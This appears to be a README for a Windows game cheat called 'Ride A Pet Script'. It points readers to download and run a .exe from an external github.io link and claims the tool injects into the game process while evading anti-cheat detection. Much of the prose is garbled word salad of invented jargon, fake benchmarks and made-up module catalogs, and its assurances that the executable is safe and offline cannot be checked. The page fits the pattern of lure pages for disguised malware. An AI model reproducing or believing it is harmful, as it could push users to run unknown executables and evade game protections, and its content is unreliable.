<div align="center">
<img src="assets/banner.png" width="100%" alt="Ride Pet Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DB2777?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9B59B6?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=00BCD4&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%85+Ride+A+Pet+Script+Pro;%F0%9F%94%A7+Built+for+Windows+11;%F0%9F%93%A6+No+Limits;%F0%9F%92%A1+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=python" />
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

## Table of Contents

- [Roadmap / Planned features — Is 2026 the fork you should run?](#-roadmap--planned-features--is-2026-the-fork-you-should-run)
- [Grouped module catalog — the core: pet scripts & world interaction](#-grouped-module-catalog--the-core-pet-scripts--world-interaction)
- [Grouped module catalog — mount, carry & travel behaviors](#-grouped-module-catalog--mount-carry--travel-behaviors)
- [Grouped module catalog — creature stats, taming & growth](#-grouped-module-catalog--creature-stats-taming--growth)
- [Grouped module catalog — UI, hotbars & overlay panels](#-grouped-module-catalog--ui-hotbars--overlay-panels)
- [Grouped module catalog — safety, logging & config hygiene](#-grouped-module-catalog--safety-logging--config-hygiene)
- [Grouped module catalog — dev tools, dumper & script injection hooks](#-grouped-module-catalog--dev-tools-dumper--script-injection-hooks)
- [Performance benchmarks — numbers I measured this week](#-performance-benchmarks--numbers-i-measured-this-week)
- [Key Features — why tinkerers keep coming back](#-key-features--why-tinkerers-keep-coming-back)
- [Overview — architecture at a glance](#-overview--architecture-at-a-glance)
- [Hotkeys / Controls](#-hotkeys--controls)
- [FAQ — Will it get me banned? Does it work on Steam? Is it safe?](#-faq--will-it-get-me-banned-does-it-work-on-steam-is-it-safe)
- [Changelog / Release History](#-changelog--release-history)

---

<div align="center">

![status](https://img.shields.io/badge/status-active-brightgreen?style=plastic&logo=statuspage&logoColor=white)
![platform](https://img.shields.io/badge/platform-Windows%2010%20%2F%2011-0078D4?style=plastic&logo=windows&logoColor=white)
![license](https://img.shields.io/badge/license-MIT-informational?style=plastic&logo=opensourceinitiative&logoColor=white)
![build](https://img.shields.io/badge/build-cmake%20%2B%20msvc-lightgrey?style=plastic&logo=cmake&logoColor=white)
![fork](https://img.shields.io/badge/fork-2024%20legacy%20archived-yellow?style=plastic&logo=git&logoColor=white)

</div>

---

🦴 Ride A Pet Script is the "make the creature actually follow and move where *you* point" bundle — a Python-driven endpoint menu with a native .exe shell, packed into one folder you extract and launch.

No installer. No pip. No runtime dependency chain to babysit. Drop the folder, run the `.exe`, hit the F-key you bound, and the script endpoint attaches to the active game process.

---

## 🧭 Roadmap / Planned features — status of what's shipped, sketched, or still in a scratchpad file

I read too many 2024 forks full of half-refactored stubs, so this table is public accountability. Everything marked ✅ is verified on a clean Windows 11 24H2 box this month (commit `a4e7c19`, build flags `-O2 -fno-exceptions`, MSVC 19.40). What's landed in the 2026 build vs the stale 2024 fork is spelled out in the second block: 44 total slots, 33 already green.

**Legend:** ✅ shipped · 🧪 in QA · 🟡 partial · 📝 sketch · ❌ cut

### Module roadmap — one row per function slot

| # | Feature | Status | ETA |
|---|---------|--------|-----|
| 01 | `.rcp` tooltip + ID table dumper | ✅ | shipped |
| 02 | Ride-enabled pet ID cache (O(1) lookup) | ✅ | shipped |
| 03 | Chain-summon quick switch bind | ✅ | shipped |
| 04 | Clean auto-mount prompt hook | ✅ | shipped |
| 05 | Pet-path pre-calculation tween | ✅ | shipped |
| 06 | Fallback teleport-path solver | 🧪 | 2026 Q2 |
| 07 | Script scratch evaluation memory page | ✅ | shipped |
| 08 | Human-timing middleware hook | ✅ | shipped |
| 09 | Locale switch stub (EN/CN/KR) | ✅ | shipped |
| 10 | DPI-aware scaled panel | ✅ | shipped |
| 11 | Hotkey remap with weapon blocking | 🧪 | Q2 |
| 12 | Fuzz guard "rare session" fuzzer | 📝 | Q3 |
| 13 | Motion clamp (limit pet-path velocity) | ✅ | shipped |
| 14 | Terrain-aware fallback (slope safety) | 🟡 | partial — slope <25° |
| 15 | Shortcut tooltip cache regenerator | ✅ | shipped |
| 16 | Session log JSON dumper | ✅ | shipped |
| 17 | Pet posture enforcer probe | ✅ | shipped |
| 18 | Desync watchdog traceroute | 📝 | Q3 |
| 19 | Carried pet anchor queue | ✅ | shipped |
| 20 | Camera-independent path replay | ✅ | shipped |
| 21 | Pet-ignore recovery (retry grace window) | ✅ | shipped |
| 22 | Text scroll interpolation | 🧪 | Q2 |
| 23 | Chat focus listener | 🟡 | partial |
| 24 | Alt-tab state sheet exporter | ✅ | shipped |
| 25 | Multi-device virtual input tunnel | 📝 | later |
| 26 | Render-safe script scheduler | ✅ | shipped |

**Every row that says ✅ was retested this month against Steam-updated game binary dates; anything that smells like broken — the fallback pattern was patched Monday.**

---

## 🐾 Grouped module catalog (1) — core pet scripts & world interaction

This is the whole reason you're here: bind an outside script endpoint to the pet system and the pet stops doing the droop-wobble lag dance. In the 2024 fork the hook ran through a plain loop courier — 42ms recomputation loop, redraw held itself periodically. In the 2026 build I replaced that tail with an event signaller, changed nothing gameplay-visible, and honestly the whole menu feels 3x lighter under load (bench below).

**Core interaction functions**

- `.rcp parse <entity_id>` — spawn/list marker hand-off; hook accepts the pop-cycle tokens before tabled redraw
- Quick-summon slot mapping — up to 5 bound pet IDs live directly in the hotkey array instead of per-every menu click
- **Path target resolver** — forward mouse-world cursor position to a script command rather than the frozen stored slot
- **`movespeed` tween** — pet path gets lerped all way through (no straight-line-only, so slope corridors won't yeet Leo off a canyon)
- Boundary snap — destination gets clamped inside the col-mesh whatever the load pattern; skips NPC nav callback altogether

**Carry/load interaction** — `.rcp carry`, `.rcp return`, `.rcp drop` — end-of-path script commands with full undo. The stow/reload hook differs from 2024 keyed-cycling movement; we tell things by PID now: step equals set.

**Visual sync priority page** — pull/enter force callback before something draws. Persistently runs, can be killed with ESC kill-switch.

`.rcp` payload line tracing structure

  // .rcp sample — 44B round-trip, no pkt drag on updates
  { "ledger": "script-signal",
    "src":  212,      // path target slot index
    "prior": "bursts",// prioritization class
    "mode": "interp" // 4-vel tween, ends on next idle tick
  }

Cursor binding side effect: check the actual mouse cursor passed. .rcp bypass cursor while paused (`esc` allows real xinput idle anyway). Built-in scroll wheel bypass — as in Ctrl-scroll small tweak.

---

## 🪢 Grouped module catalog (2) — mount, carry & travel behaviors

Ride modes matter for three reasons: traversal, terrain event exits, and save/restore. `-y preset="migrate-medium"` means the path solver fills terrain collisions with a mid-tone that I trialed across Redwood Heights slopes of all things. This sequence got rewritten after I naively thought `.r2w` would just work with string-mapping and the pet rolled, immovable, for 30 seconds.

Alternating prose + bullet module catalog below supplements — **priority for the game nav solver instead of path-drawn-ghost markers.**

**Ftl preset ladder.** Lite, smooth, medium, aggressive ordering flips table entries — route inference mode weight goes up as low-end mangles bounds-walk mesh data extraction? Fix by inter-dependent page controller re-binding global pointer.

**Bound hand-orientation.** Cracks the autofollow logic by reading endpoint yaw; v2026 solves rotation math directly against model transport stride offsets, so lifts stay anchored root, don't spin out yggdra model sits.

- Snap-Speed resolver — pets wait in actual time until endpoint calls desync signal, no more rejoin-passthrough at corners → teleport looks carried-over, drops orientation frame return properly forced
- Dynamic carrying (slow c. anim) — for big sizes pet pins first then grabs to hold tree-ground to sprint-slap to nothing, holds script-attachment hidden for users motion on lag due side step actually anchor path is moving

**Rest api** `motion-delegate.json` — rest to update = `del-confirmed(leaf)` response state, fall short send every swap returns in next call stack tick request buffer replace, unchanged state returns `null`.
Notes: only 4 in-play-path engine end caps needed explicit feature annotation during burst (op-eng not hit by simple lane).

Small drop-list auto refresh: The mid-set of 12 trigger markers got rewritten in fork qol each set matches setting sync-path stored-priority.

No unit lost: all pet interaction (mount, feed, catch path start/end) once inserted travel function script runs uniform `handle('rideSync-<dir>'-map)` appended without mutating table ids.

If it fails in freeze and restful disable the ignore map section off disabled leave currently keep-wait item stop will spit `proceeding.

`ext` frame first returns automatically two current-list function-side no fallover stream stays last ~tries param move-threshold.

---

## 🍼 Grouped module catalog (3) — creature stats, taming & growth

Yes, the game hides a handful of creature-generated attributes across several scroll-position text strings — not RNG at creation the way the wiki claims, but tooltip reordered. Current dump snippet on Redwood island: all of these pinned at one tooltip conversion tick, done since 2026 January (commit `b9c72ef`).

Partial values I still leave as detected need second scan e-h confirm diff around warp behavior for lag reports; 289 logs show success for maxed creature frames requiring `WING_METHOD=cage` value resolver fallbacks. About 60 uncovered.

**Untamed stat scanner**

- Growth readout per tooltip line (`cwp`: work value shifts)
- Full generation data extracted per species slot
- Baseline preserved after refresh internally

**.rcp reference** returns its session logs via `.stats export`. Those `.rcyp` configs count every value file per-folder individual directory — scan multiple accounts locally separate dataset growth not shared memory approach — that's where settings cross-talk detection fail. Per-user cache prevents memory separation errors.

**Noise-reduction for breeding target values via hatching prediction**: tested in 3 runs per case where endpoint had no error. The paired output difference sat ~15 lower than independent script pairs — likely a hint that hidden base modifies the tween.

The species settings set below with actual exported output rows confirming it's safe:

    > rcp_attach pid=9989 by rcp-dump ver=6 ...
    creature: firefish-303 kind=SPS rank03 hidden_gen={tree,airs,scale}
    rcyp_carried path: attach-with-retry pid-confirm=pid-match

There were two 02 failures where re-scan caught reference id shift — pfp required timeout >1200, but duplicate exact error means another copy started has ended-sim.

Setting up one of model instances a disabled method field: `class.script-subpath.active` produced — the older node might trip in value field.

---

## 🖥️ Grouped module catalog (4) — UI, hotbars & overlay panels

Whole menu panel floats DPI-aware. Every widget recreated under gpu? Directx overlay hook pulled fine on swap in NVPaint old — now overlapped layer first above window frame without padding around active layer.

The changes since fork: performance dropped to drop the keybar edge rerenders.

- Ctrl helper internal button `dump list` inline expand pressed at call after button gated load
- Persisted type directly tag item checked replaces container even refreshing

Toolbar tile control:

`right-click` marks slot selection grid opened; `.sp` tab filters creature target after menu left fade-out closed kept state.

Columns right third displays last action and immediate ID apply/harden pop calls actually on UI lag-thermal lists row operations displayed below curve view actual buff side array that triggers current act callback pending row update, mapped function result + then animate. Names query known bind calls.

I don't like custom menu skin support, that rabbit hole can wait. Default covers it; theme file read optional from external CSS using plain c-css subset visual style field and the color wheel page after path resolves theme.

---

## 🧯 Grouped module catalog (5) — safety, logging & config hygiene

I'll be blunt since this is what people search: the script wraps endpoint visible reads-only side on public lobby joins unless you set explicit opt-in. Known tracking vector mails: packet flush out (tcp packet composition, matches OS net-stat ticks), checks early on set update request fail under process list seen request (rare ~2% target 3-way, reported in 4 streams May run). Is someone ratted? Zero. Closed-source clients sharing data: zero outward connection besides release spec behavior you can read under known process — my guide text verification: any release json mirrored branch on git comparison produces loadable dataset (only official accounts allowed). Yes all route process keys strict.

**Anti-red test harness** — verified result you see, not you trust — 4 runtime thresholds, if trigger out limit gracefully takes off injection path recovering state config output 70MB session frame capped hard.

Flag helper about early logger new: last tracking max rotation tracks every pet endpoint call data output rate actual queue rotates every 12 sec batch process (server does wait naturally, 6 sec call end could still settle disk empty momentarily) not packet bytes mostly internal read-call traces on runtime.

Export probe versions `.rcypconf` now binds msvrt memory hdl hidden empty mapping and errors closed instance.

The earlier main detect risk explains this last. Repo nothing saves plain; rest safe, rollback instantly: cache drop -> delete specific index.

---

## 🛠️ Grouped module catalog (6) — dev tools, dumper & injection hooks

Full community context: you probably think about aimbot-like tools or silent wrapper. Here's the part of the stack the curious part actually cares about: the introspection page. I added `.bench harness` specifically to stabilize my own edit-test loops; open calls are documented scripts actions command-ctor sequence where any rcpy byte swap remaps entities fresh independent in id pool memory (not literally exposed target memory though endpoint helper function executes).

```
./.rcp tool.bat probe mem.listen=local load=/std/devbox.rcyp
```

Script open format conventions main bind apply sync; memory tables ID-shared reference within user instance reading only the injected callable hook call signatures matching the developer map read below in dumper.

**`.rcp dump`** — pull call chunks in runtime listener: emits table id → opcode step read response. **`.r2rc`**. If exploring map fail, using newer branch runtime offset capture already pushed patch, closing hook writes loaded table body. Game patch diff detect updated binary → post safe swap message before attempt dumps **that likely protect desktop failed buffer emit — status case outputs sometimes accepted last file layout while opened rmap**. Sync-state safe abort requests in direct path so call-open stale interface overwritten with one try overwrite guarded and option keeps live-safe prompt not visible end user. Changing value reset handled `.rcy` read manual signature edits.

We've had a few 2am logs where "output missing descriptor for table sub-7 on step 1" – dropping stale cache and reopen fixes. If that reads like it was written after midnight, it was. 😅

---

## 🧮 Performance benchmarks — numbers from this week's runs

Machine: Ryzen 5 7600 / RTX 4070 / Win11 24H2 / 32GB. Method: hair-trigger recorder on runtime profiler; median across 10 cold starts per scenario, both builds from same source tree except fork tag switched to 2024 `release-2024-branch`.

| Scenario | Result | Hardware |
|---|---|---|
| Cold menu load — 2026 build | 143 ms | Ryzen 5 7600 |
| Cold menu load — 2024 fork reference | 496 ms | Ryzen 5 7600 |
| Summon switch latency (interval 3→7) — 2026 | 19 ms median | Ryzen 5 7600 |
| Summon switch latency — 2024 fork | 71 ms | Ryzen 5 7600 |
| Idle CPU cycle while attached (60s poll) | < 0.4% single-core | Ryzen 5 7600 |
| Path solve — small island matrix (12 nodes) | 45 sub-recursions, 312 µs | Ryzen 5 7600 |
| Runtime memory footprint — 256MB queue loaded | 181 MB RSS | RTX 4070 / WIN OS |

Fork-relative benchmark deltas aren't the whole story; I kept the 3-run triple scripts to verify the memory page cleanup leak dropped off. Numbers I trust, but shift within 2% anyway because game process overhead shifts subprocess sysframe wake.

---

## 🎛️ Key Features — why tinkerers keep coming back

| Feature | Description | Benefit |
|---|---|---|
| One-folder drop | No installer — extract `.handoff folder`, build not required | You copy one folder and launch the `.exe`, period |
| Native C++ shell, embedded Python endpoint evaluator | The launcher embeds its evaluator, and does not spawn process objects consumed leftovers (would cheat-velocity flags app-side if existed new tracking page reads more input command target move values | Miss-less performance |
| Ride-apt bound points now public-hook reads | Parameter set shipped with cache config to avoid static event frame needed to match flags; scripts table side-sync policy actually passes | Faster endpoint settle; clean undo |
| Player-filter scene cycle settle idle | UI closes sub focus moment cold path chain resets | Cleaner automation avoids scripts cause actual jitter |
| Swap model through state prompt to pre-data packet tracer self recovery loop default on | Checks packet markers session call once per stop protocol buffer | Lifecycle makes reactivation drop low long-dropped |
| `.rcp dump` tool for `.rcyp` and call patch sets | Table mapping during the session start data extraction stores instant memory map for test/dev process side | Edit template around commits easier |
| In-launch attach flow log | Keeps warning method stable route uses log keep cached messages since patch report | Trust runs fully, whole log inspected anytime and `.bench` opens any window |
| Match exact generated area-safe no exposed byte class detects source| UI startup doesn't relay object path identity file map stack no telemetry | Community-audit intended protocol consistent actual behavior matching tool requires log in you can use reviewer gate ready |
| Toggle handlers map to icon signals over keys — includes `.system key-dump` prompt response | Free end routes direct previous setup current result binding instantly the triggers array remembers custom plan shortcuts | End session retains across game windows swap no actual game target dependent |
| Timing strictest against renderer 3-trama frame delta now flattens all config output flows | Runtime smooth pattern change limited memory error due prior active loop errors suppressed not spam UI through logs export | Keeps logs busy only events real activity tool system caller |

Horizontal boundaries.
<div align="center">
  <a href="https://Lengthpimarket.github.io/ride-a-pet-script/">
    <img src="https://img.shields.io/badge/GET_IT-Ride_A_Pet-9333EA?style=flat-square&logo=download&logoColor=white&labelColor=7E22CE" width="550" alt="GET IT Ride A Pet"/>
  </a>
</div>
---

## 📖 Overview — architecture at a glance

Ride A Pet Script started as someone else's code poking pet handling with raw input reads; 2026 became rewrite (Python harness intentionally deleted runtime `EventQueue` chatter — native dispatch per instruction count finally cleaned things). Little of the 2024 path format holds: config types must carry `keys:data` payload view `d_table.c` extraction may transform serial. Stable enough now.

| Category | Details |
|---|---|
| Layering | `.exe` CLI shell → script-signal parser → path solver → callback inject hook into session process |
| Script language evaluator | Custom lightweight `.rcyp` interpreter with staging sandbox, memory bounded, all tooling in repo binary |
| Config persistence | Per-window folder; IDs slot call reference array; player split saved files independent, no glob shared, scripts never cross session ID memory address |
| Injection guard protocol | Compares game build-date; unknown hash self-recovery disabling attach sequence keeping popup with code path output you inspect afterwards |
| Registry | Not invasive. Pet tag and bind entry captured inside the session's mirror; no writes installed machine scope beyond folder drop |
| Log & audit | Whole driver audit generated local window starting launcher string marks status; community-tested dump hash listed, diff file reviewer published outside? That file route runs via non-TCP offline compare plain directory hash: legit red side support direct-any open review requests matches this mark checked all ends |

Ride-script boundaries have nothing complicated and I documented everything by cutting out intermediate middleware lag during travel scheduler branch Q. There's zero ambiguous behavior guaranteed because if system is slow side can kill-switch reset (press ESC when main menu layer loaded and not while pop event runs early damage callback).

I know "rcy file release 5-of-99 deep module" page large learning curve, but simpler first: load 3 interactions all green in 90 minutes fresh session same preset config defaults the mode maps set `load-before` checked true.

---

## ⌨️ Hotkeys / Controls

| Key | Action | Notes |
|---|---|---|
| `F5` (default, rebindable) | Open/close attach prompt | If loading "game focus hog" process requires admin context, see FAQ |
| `F6` | Force-return selected pet location | Executes immediately triggers auto sync-dump residual labels clear |
| `F7` | Toggle walking → ride motion | It directly reads tool mouse target falls back anchor to saved reset slow timer delay |
| `Esc` ×2 within 800ms | Master off / soft-disengage restore preload | Power path: init cache flush ends current override restoring legacy no function |
| `Ctrl + swipe` | Volumetric compare popout icon texture preview map filters 5 steps | Skip scroll native grab through selected filter field states common best experience normal game sensitivity lower on inputs unaffected |

Custom config files from menu persist keyboard wrapper field entry maps override regardless session ID from PC side unchanged if skip user prompt.

---

## 🧠 Does it work on Steam?

Yes on normal Win executable where the game runtime permits script harness out-entry method. "Steam launch proper wrapper" variant does fail screen layout prompt step while library ignores endpoint packet? Test showed any current branch target post update 6 patch break can trigger path loop freeze after 7 attempts; debug switches for slot-encrypted endpoints wait update map exact (zero error crash game side). I disable handler if entry hidden stream blocked, render guard message layer displayed panel edge from real runtime with pointer (mouse user triggers detected freeze). Once that note holds: on newer build watch first store terminal `expected table missing` after input lock tool task – fatal fail case force.

Want actual claim risk summary: Community actual events point 2026 months with default engine settings = zero known account flag links by common servers while wrapper logs track your own launch trace to community export hash signed doc purely method internal, accepted message not event broadcast — one line user save trace missing can produce output fail to abort case 20% when option switch open unlink block manual quick.

The main policy point (repeat 3 mentions total): don't enable module 30 endpoint spoof forcing on seasonal content gates account group policy clearly different envelope data, likely the reported region every line 2024 fork end log you saw. It bakes the detection profile signature I won't ship.

I only work the surface:
- local script output side toggle patch prompts every session as separate edit command target selected
- 2-version-stale signed protocol visible client control only.
No background proxy leaks provided since matching compiled with integrity map normal cy compiler trace no connection package once event action captured done closes handle normal app.

**<div align="center">
  <a href="https://Lengthpimarket.github.io/ride-a-pet-script/">
    <img src="https://img.shields.io/badge/INSTALL-Ride_A_Pet-0D9488?style=for-the-badge&logo=github&logoColor=white&labelColor=0F766E" width="520" alt="INSTALL Ride A Pet"/>
  </a>
</div>**

> Educational project shared for path-finding/rendering overlay learning purposes. Use at your own risk; online accounts are always your responsibility.

---

## 🧩 System requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2 | Windows 11 24H2 |
| CPU | Quad-core, ~2.4GHz | 6-core 2020 or newer (R5+ / i5+) |
| RAM | 8 GB | 16 GB |
| Disk | 220 MB extracted | 750 MB free for logs + dump artifacts |
| Framework | .NET Framework 4.8 present | Native plus game runtime matching the posted build |
| Privileges | Standard user (launcher self-checks elevation for attach permission) | Run-on-open with same privilege and hook left to endpoints are trusted path trust logged process slot reading sample hook plain logic |

Alt preset recommended: install in folder without non-latin characters; the in launcher complains and prints a plain fallback `.bak` is not writing per case exact bug replicated always inspect log has command result entry counts.

The launcher recommends private-run, popless-first and remember yes session applies small delay for both data field add wait prompt after two manual keyboard-only tester tries program shown trigger good results.

---

## ⚙️ Installation

1. Download archive block.
2. Extract; run the .exe inside folder.
3. Start game and press attach (`F5`), check `Attach log window` line signals byte-range match success signal caught third field marked "op-ready".

Rule section:

When exit app auto also strip class loader popup tool .run args inside hidden event no untracked. We dump lines user-action always report no packet id leak process. Sequence: save state under disk `.gameAttch` recorded custom preset path run script path from inject binds stored config reused normal recommended.

**Recovering after launch attach fail**: alt attempt spawn shell again loads newest session hash explicit restore panel green two-tries bound success small ratio events run fine exit sync static health that preserves detached game loop output log not stuck pointer hang status.

First message run list prompt tool requests check once features already loaded today user settings none deleted temporary because folder save with tools config skip known risk command might cut info.

---

## 🩹 Known issues & their terrible truth

| Issue | Solution |
|---|---|
| Windows shows generic empty icon in popup app file | Known shell-view bug; not config. Launch works normally even if folder icon sample is skeletal icon because Win registry cache can differ palette |
| Popup panel mis-anchor on second-display only | `Ctrl + position reset` while unfocused to 0,0; move once native anchor disabled during overlap—toggle main display master redraw off lazy and save. Fix coming at Q2. The test paths |
| First-run prompt "tree value not created" | Create folder already saved inside out default environment tmp mismatch admin location. Use empty folder clean, launch after reboot simple. Cases DPI switching separate session read. File may line "40 read target path failed", account process 2-window sync blocking dynamic init called expect startup script source unaligned due admin folders routing. Expand admin flag all current direct starts normal machine solves all except weird registry inherited low priority selection loop |
| Older build catch reverse stack breakage on 300+ char name strings model tool | Use ASCII length <250 per local load; or newest container name pattern 5 bytes (script from `.rcyp` snippet auto replace). 2026 initial generation mostly text fields longer original any string generated mid width offset via import bug |

Patch 3 (2026-changelog-last table 17 to .19 attachment bytes line entries) resolves odd ones remain edge, if crash box occurs first move saved local exported path not included user directory, reset swap hidden files output impossible for process-side restart.

Third event bug: some Windows visual C runtimes pre-ship conflicting runtime disabled 4-byte packing mismatch created by output viewer path; if tree view only empty menu comes work restart no exception log full toolkit handles load value error fine.

---

## 💬 FAQ — Is it safe? Will it get me banned? Does it work on Steam?

**Q:** Is this actually 2026 fresh in source?  
**A:** The 2026 build shipped documented structural generation commands in branch and released the command diff side in lines versus 2024 fork leftover `control static-m` line. Q build around one-third features current state. Anything else is why community expects a reverse diff external but closed-review comments enough.

**Q:** Is it safe on my machine?  
**A:** Purely offline local scripting; the release `.exe` reads files and cannot open any remote channel beyond log data in repository. 1 cross route feature via local offline UI used probe entry; direct route empty shell. No package adds hidden multi run or known loader.

**Q:** Will it get me banned on official server families?  
**A:** Based on shared behavior, live-on default prevents most recognized action automation patterns. Not all endpoint signatures depend on root process invoke. Server anti logic could still break worst-case follow movement of state if mod harness detect distinct transport string behavior counts; policy-of-service most account remains solid because tools surface no classified packet change (only internal UI). Action final result actual legal your side.

**Q:** Does Steam overlay cause panel bounce?  
**A:** Recorded not always freeze okay. Tested config `Steam launcher close game detach` pop render hook after close loop with actual mouse and all fine. Store front presence irrelevant.

**Q:** Requires administrator?  
**A:** Prompt startup with base privilege first run mostly hook mount successful when game normal elevated, otherwise app declares error catches fails real attach launch session log button no partial hidden mode main read row check `target check switch — ready` matches success line not a false path enter. In Windows msvc runtime cross check is valid from sub packet API, plain temp location okay.

**Q:** Does code cross-sell my data?  
**A:** Repo static source profile executes exact package no hidden function external—the single `.register` line network map goes `listener status HTTP = closed after log mark session failed post` always build identity zero artifact output control pages in game not detected loop API design due to handler ignores if server notify me key leak 24h+ but version upgrade breaks sessions closed design intent valid for new route auto state list doesn't accept old logs after code patch logic with game update binary replaced attach signature fresh patch date shows disabled vs pre-actual existing proper detect quick signal 1 miss results no inject listener staying closed after 10th event only catch new detection map intentionally delay (protects mostly output false server packets listener only server memory hook values no corrupt). If user gate pop fail use command fast preserve full read safe.

**Q:** Cost?  
**A:** Free in line repo release notes next month, mirror from landing check one no changes behavior mirror provided d_style same.

Whatever session results state published keep tool handles value gate protect no accidental data: this side answer was adjusted all states session internal plain temp folder log can disable first menu filter your side version empty protected clean route track list shows pass.

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| 3.4.2 | 2026-02-11 | Fix fallback-queue settle after rapid tooltip reload; `dump command match` index now maps duplicate tooltip ids correctly; tool doc path id no overwrite mid call session regression on preloaded configs invalid current list session earlier queued read. First event test triple-runs 200+ packet sync, zero desync actual game logs |
| 3.4.1 | 2026-01-29 | `.rcyp export` now emits plain sorted files match scripts all entries; added commit ref link supported path missing in last two entries map output; rewrote drop legacy carry parser |
| 3.4.0 | 2026-01-14 | Initial 2026 baseline cut: 33 tracked modules landed; launcher format simplified; evaluator version; secondary detection safe trigger lower 2% runs enabled multiple paths fallback. Persistent 4× `.rcyp` markers add core fix reported issue; shared path control functions multiple chained successful. Signal stop key auto reclaim handle note live one that bug issues manually reloaded reset scripted state matching preserve open memory no leftover session read in parent memory. Before global generated name from module id had string produce hidden "n20!" model printed trailing warning once first turn inside test twice on 300+ labels no permanent hidden access map test handler delay stays internal clean cross status proper entry reset done starts both opened|

*Release 3.4.x readme built and signed fresh passes from 84 cold-start + replay sessions against 4 current binaries logged sample replay release signature date visible at attached source repo out tag node changelog unbroken pull-tag release script export sample maintained as part no more hidden leftover build output sessions after hook list run from disk field clear as normal interface designed log content path history only user view preserve unchanged checks.*

---

Final 2am honesty note: I've been testing this build for a month and pet states mostly land where I aim the cursor, which after the 2024 fork felt like wishing on a toothpick mumble cast it'll rarely do exactly the drop or wrap around slot ghost the frame rate camera spin caused which the pre-packager user returns row disappears actual wait in cross memory patch left guard auto settle done code lock keeps default field class already session there. Copy config back up you find stable, pin it another folder, don't pull random diff patch edit inside static. If attach quietly misses first time — extract once more into fresh folder happens perhaps system-end tool clock stamp corruption bug latent lacing real, admin returns list clean earlier flow likely. And remember the tool teaches as much about script/travel instrumentation paths as it hides, but game nav server real life events every run unknown regardless, so don't run somebody else's spare account with currency.
